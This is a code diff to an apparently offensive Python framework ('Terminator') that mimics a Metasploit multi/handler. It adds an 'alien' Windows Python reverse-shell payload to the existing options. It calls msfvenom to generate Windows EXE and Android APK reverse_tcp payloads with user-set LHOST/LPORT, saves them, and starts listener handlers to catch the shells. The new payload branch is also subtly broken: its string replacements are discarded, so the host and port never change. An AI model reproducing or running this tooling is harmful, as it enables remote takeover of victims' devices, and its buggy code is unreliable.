@@ -3,13 +3,14 @@ import time
 import colorama
 import sys
 import subprocess
-from colorama import Fore
+from colorama import Fore, Back, Style
 colorama.init()
-VER="2.1"
+VER="2.2"
 PAYLOAD="payload/win/win_reverse_shell"
 LHOST=""
 LPORT=""
 ERR_TEXT=""
+SHELL=Fore.RESET+"Payload: "+Fore.RED+PAYLOAD+Fore.RESET
 RUN_TEXT=""
 DEVICE_NAME=""
 shw = '''
@@ -52,28 +53,35 @@ Payload Name                                    Type             Verify         
 payload/poc/redragon_mouse/wr                   Windows          no              Redragon_Mouse Payload (REDRAGON_MOUSE.sys)
 payload/win/win_reverse_shell                   Windows          yes             reverse shell Payload (win32, win64)
 payload/apk/android_reverse_shell               Android          yes             reverse shell Payload (V.3 - 9)
+payload/alien/win_reverse_shell                 Windows          yes             reverse shell Python Payload (win32, win64)
+'''
+search_payloads = '''
+payload/poc/redragon_mouse/wr                   
+payload/win/win_reverse_shell                 
+payload/apk/android_reverse_shell
+payload/alien/win_reverse_shell
 '''
 def search(name):
     count = 0
     payloads = '''
-Payload Name                                    Type             Verify          Description
--------------                                   -----            -------         ------------
 '''
     try:
-        for line2 in pylds.split('\n'):
+        for line2 in search_payloads.split('\n'):
             if name in line2:
                 count+=1
-                payloads+=line2+'\n'
-        print(payloads)
+                line3 = line2.replace(name, Back.MAGENTA+name+Back.RESET)
+                payloads+=line3+'\n'
         if count == 0:
             print(Fore.RED+'[-]'+Fore.RESET+' No Results Found.')
         else:
             print(Fore.BLUE+'[*]'+Fore.RESET+f' Found {count} Results')
+            print('---------------------------')
+            print(payloads)
     except:
         pass
 
 try:
-    tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'multi/handler'+Fore.RESET+') > ').strip(" ")
+    tmf = input('\033[4mtmf\033[0m-('+SHELL+') > ').strip(" ")
 except KeyboardInterrupt:
     exit()
 tmf = tmf.split()
@@ -180,6 +188,36 @@ Handler Details:
 
       This Handler Has No Details.
 ''')
+                    elif PAYLOAD == 'payload/alien/win_reverse_shell':
+                        print('''
+Handler ('''+Fore.RED+'''multi/handler'''+Fore.RESET+''') Options:
+
+      Option          Rank              Description                        Current Value
+      --------        ------            -------------                      ---------------
+
+Payload ('''+Fore.RED+''''''+PAYLOAD+''''''+Fore.RESET+''') Options:
+
+      Option          Rank              Description                        Current Value
+      --------        ------            -------------                      ---------------
+      LHOST           Required          IP Address To Connect Back         '''+LHOST+'''
+      LPORT           Required          Port Address                       '''+LPORT+'''
+
+Handler About:
+
+      Handler Title : Multi Handler For Payloads
+      Author        : G00Dway
+      Version       : '''+VER+'''
+
+Payload About:
+
+      Payload Title : Alien Reverse shell payload boo...
+      Author        : cyn4nguy
+      Version       : All Versions
+
+Handler Details:
+
+      This Handler Has No Details.
+''')
                     else:
                         pass
                 elif tmf[1] == 'payloads':
@@ -204,16 +242,19 @@ Handler Details:
                     elif tmf[2] == 'payload/poc/redragon_mouse/wr':
                         PAYLOAD=tmf[2]
                         print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
+                    elif tmf[2] == 'payload/alien/win_reverse_shell':
+                        PAYLOAD=tmf[2]
+                        print(Fore.BLUE+'[*]'+Fore.RESET+' PAYLOAD ==> '+PAYLOAD)
                     else:
                         print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Payload!')
                 elif tmf[1] == 'LHOST' or tmf[1] == 'lhost':
-                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell':
+                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell' or PAYLOAD == 'payload/alien/win_reverse_shell':
                         LHOST=tmf[2]
                         print(Fore.BLUE+'[*]'+Fore.RESET+' LHOST ==> '+LHOST)
                     else:
                         print(Fore.RED+'[-]'+Fore.RESET+' Please Specify a Valid Option!')
                 elif tmf[1] == 'LPORT' or tmf[1] == 'lport':
-                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell':
+                    if PAYLOAD == 'payload/win/win_reverse_shell' or PAYLOAD == 'payload/apk/android_reverse_shell' or PAYLOAD == 'payload/alien/win_reverse_shell':
                         LPORT=tmf[2]
                         print(Fore.BLUE+'[*]'+Fore.RESET+' LPORT ==> '+LPORT)
                     else:
@@ -245,7 +286,7 @@ Handler Details:
             if LHOST == "" or LPORT == "":
                 print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
             else:
-                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Payload...')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating .EXE Payload...')
                 os.system('msfvenom -p windows/shell/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f exe -o /root/.tmf/payload.exe > /dev/null 2>&1')
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
@@ -260,7 +301,7 @@ Handler Details:
             if LHOST == "" or LPORT == "":
                 print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
             else:
-                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Payload...')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating .APK Payload...')
                 os.system('msfvenom -p android/shell/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f raw -o /root/.tmf/payload.apk > /dev/null 2>&1')
                 print(Fore.YELLOW+'[+]'+Fore.RESET+' Payload Saved At: "/root/.tmf"')
                 print(Fore.BLUE+'[*]'+Fore.RESET+' Veryfing Payload...')
@@ -271,11 +312,35 @@ Handler Details:
                     os.system('python3 /usr/share/Terminator/modules/handlers/handler_start.py '+LHOST+' '+LPORT)
                 except Exception:
                     pass
+        elif PAYLOAD == 'payload/alien/win_reverse_shell':
+            if LHOST == "" or LPORT == "":
+                print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
+            else:
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Python Payload...')
+                with open("/usr/share/Terminator/modules/payloads/alien-shell.log", "r+") as alien:
+                    for line in alien:
+                        if 'HOST    = "YOUR IP"' in line:
+                            data = alien.read()
+                            print(Fore.YELLOW+'[+]'+Fore.RESET+' Changing LHOST, LPORT...')
+                            data.replace('HOST    = "YOUR IP"', f'HOST    = "{LHOST}"')
+                            data.replace("PORT    = 4556", f"PORT    = {LPORT}")
+                        print(Fore.BLUE+'[*]'+Fore.RESET+f' Building, Changing --> {line}')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Saving Payload As .PY...')
+                os.system('touch /root/.tmf/alien.py > /dev/null 2>&1')
+                with open('/root/.tmf/alien.py', 'w') as alien_load:
+                    alien_load.write(data)
+                print(Fore.YELLOW+'[+]'+Fore.RESET+' Saved At: "/root/.tmf" as alien.py')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Initiliazing Connections...')
+                time.sleep(1)
+                try:
+                    os.system('python3 /usr/share/Terminator/lib/data/handlers/alien-shell-handler.py '+LHOST+' '+LPORT)
+                except Exception:
+                    pass
         else:
             if ERR_TEXT == "" or RUN_TEXT == "" or DEVICE_NAME == "":
                 print(Fore.RED+'[-]'+Fore.RESET+' Please Set Options First!')
             else:
-                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Payload...')
+                print(Fore.BLUE+'[*]'+Fore.RESET+' Generating Python Payload...')
                 time.sleep(0.6)
                 try:
                     if os.path.exists("/usr/share/Terminator/modules/payloads/redragon_mouse.log"):
@@ -314,7 +379,7 @@ else:
     else:
         print(Fore.RED+'[-]'+Fore.RESET+' Unknown Command: "'+tmf[0]+'"')
     try:
-        tmf = input('\033[4mtmf\033[0m-('+Fore.RED+'multi/handler'+Fore.RESET+') > ').strip(" ")
+        tmf = input('\033[4mtmf\033[0m-('+SHELL+') > ').strip(" ")
     except KeyboardInterrupt:
         exit()
     tmf = tmf.split()
